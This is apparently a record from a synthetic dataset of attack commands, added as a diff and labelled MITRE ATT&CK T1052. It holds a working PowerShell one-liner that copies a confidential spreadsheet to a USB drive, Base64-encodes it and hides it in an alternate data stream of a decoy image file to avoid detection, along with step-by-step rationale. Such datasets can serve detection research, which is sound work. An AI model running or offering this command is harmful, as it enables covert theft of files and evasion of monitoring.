@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); New-Item -Path \"$dl:\\Pictures\\wallpaper.jpg\" -ItemType File -Force | Out-Null; $b=[IO.File]::ReadAllBytes(\"C:\\Users\\Public\\Documents\\confidential.xlsx\"); $b64=[Convert]::ToBase64String($b); Set-Content -Path \"$dl:\\Pictures\\wallpaper.jpg\" -Stream \"thumbs\" -Value $b64",
+  "explanation": "Encodes a sensitive file as Base64 and stores it in an alternate data stream on a benign-looking file on the USB to reduce detection while exfiltrating via removable media.",
+  "rationale_steps": [
+    "Resolve the USB drive letter and ensure a cover file exists.",
+    "Read the target file and convert its bytes to Base64.",
+    "Write the encoded data into an ADS on the USB file."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-d23851d8",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
